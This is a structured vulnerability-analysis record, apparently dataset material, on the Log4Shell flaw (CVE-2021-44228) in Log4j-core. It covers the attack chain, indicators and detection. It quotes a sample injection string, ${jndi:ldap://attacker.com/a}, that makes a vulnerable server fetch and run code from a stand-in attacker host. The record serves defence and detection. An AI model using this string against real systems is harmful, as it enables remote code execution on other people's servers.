package_info.why_malicious: The affected versions of the Log4j-core package contain a critical vulnerability (CVE-2021-44228, 'Log4Shell') that allows attackers to trigger remote code execution by injecting specially crafted log messages. This is due to unsafe handling of JNDI lookups in log message processing, enabling attackers to load and execute arbitrary code from remote servers.

execution_context.trigger: runtime (when a log message is processed)

malicious_snippets.code_language: java (expression in log message, resolved by Log4j)
malicious_snippets.code_behavior: At runtime, when a log message containing a JNDI lookup pattern is processed, the code triggers a JNDI lookup to an attacker-controlled LDAP server, retrieves a serialized Java object or class file, and executes it, resulting in remote code execution.

malice_analysis.why_suspicious: This behavior allows untrusted user input to trigger network requests and load/execute code from arbitrary remote servers, which is a classic remote code execution vector.
malice_analysis.violated_expectations: Normal logging frameworks should never interpret log message content as executable code or perform network lookups based on untrusted input. Log messages should be treated as data, not as code or configuration.
malice_analysis.similar_legitimate_use: JNDI lookups can be used legitimately for internal resource resolution in trusted environments, but not with untrusted user input.
key_indicators: Log message content triggers network requests via JNDI
Dynamic code loading from remote servers
No input validation or sanitization on log message content

attack_chain.action: Attacker injects a specially crafted string (e.g., ${jndi:ldap://attacker.com/a}) into any field that will be logged by the application.
attack_chain.leads_to: Log4j processes the log message and performs a JNDI lookup.

attack_chain.action: Log4j performs a JNDI lookup to the attacker-controlled server, retrieves and executes malicious code.
attack_chain.leads_to: Remote code execution on the vulnerable server.

behavioral_signatures: Unexpected outbound LDAP/RMI/JNDI network requests from Java applications
Dynamic class loading from remote servers during log processing
file_indicators: Presence of vulnerable Log4j-core versions (2.0-beta9 through 2.14.1)
References to JndiLookup.class in application JARs
network_indicators: Outbound LDAP/RMI/CORBA requests to untrusted or external servers
Connections to attacker-controlled domains in log processing context
detection_knowledge.how_to_detect: Monitor application logs and network traffic for suspicious ${jndi:...} patterns in log messages, and for unexpected outbound LDAP/RMI connections from Java processes. Scan application dependencies for vulnerable Log4j-core versions and the presence of JndiLookup.class. Use static analysis to detect untrusted input being logged without sanitization.
